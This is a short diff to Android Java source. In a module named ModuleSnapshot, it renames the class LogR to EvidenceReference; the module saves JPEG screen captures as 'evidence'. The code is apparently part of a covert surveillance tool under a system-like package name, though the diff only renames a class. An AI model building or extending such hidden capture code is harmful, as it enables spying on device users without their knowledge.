@@ -28,7 +28,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.file.AutoFile;
 import com.android.networking.listener.ListenerStandby;
 import com.android.networking.util.Check;
@@ -240,7 +240,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					byte[] jpeg = toJpeg(bitmap);
 					bitmap = null;
 
-					LogR.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 					jpeg = null;
 				}
 				
